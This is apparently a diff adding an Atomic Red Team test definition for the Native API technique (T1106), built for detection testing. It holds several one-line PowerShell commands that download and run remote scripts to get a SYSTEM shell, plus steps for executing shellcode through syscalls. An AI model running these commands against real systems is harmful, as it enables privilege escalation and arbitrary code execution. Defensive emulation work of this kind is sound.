@@ -1,0 +1,79 @@
+attack_technique: T1106
+display_name: Native API
+atomic_tests:
+- name: Execution through API - CreateProcess
+  auto_generated_guid: 99be2089-c52d-4a4a-b5c3-261ee42c8b62
+  description: Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.
+  supported_platforms:
+  - windows
+  input_arguments:
+    source_file:
+      description: Location of the CSharp source file to compile and execute
+      type: path
+      default: PathToAtomicsFolder\T1106\src\CreateProcess.cs
+    output_file:
+      description: Location of the payload
+      type: path
+      default: '%tmp%\T1106.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      #{source_file} must exist on system.
+    prereq_command: |
+      if (Test-Path "#{source_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "#{source_file}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1106/src/CreateProcess.cs" -OutFile "#{source_file}"
+  executor:
+    command: |
+      C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /target:exe "#{source_file}"
+      %tmp%/T1106.exe
+    name: command_prompt
+- name: WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique
+  auto_generated_guid: ce4e76e6-de70-4392-9efe-b281fc2b4087
+  description: Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
+    name: powershell
+- name: WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique
+  auto_generated_guid: 7ec5b74e-8289-4ff2-a162-b6f286a33abd
+  description: Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')
+    name: powershell
+- name: WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique
+  auto_generated_guid: e1f93a06-1649-4f07-89a8-f57279a7d60e
+  description: Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
+    name: powershell
+- name: Run Shellcode via Syscall in Go
+  auto_generated_guid: ae56083f-28d0-417d-84da-df4242da1f7c
+  description: |
+    Runs shellcode in the current running process via a syscall.
+
+    Steps taken with this technique
+    1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
+    2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
+    3. Change the memory page permissions to Execute/Read with VirtualProtect
+    4. Use syscall to execute the entrypoint of the shellcode
+
+    - PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#syscall)
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug
+    cleanup_command: |
+       Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
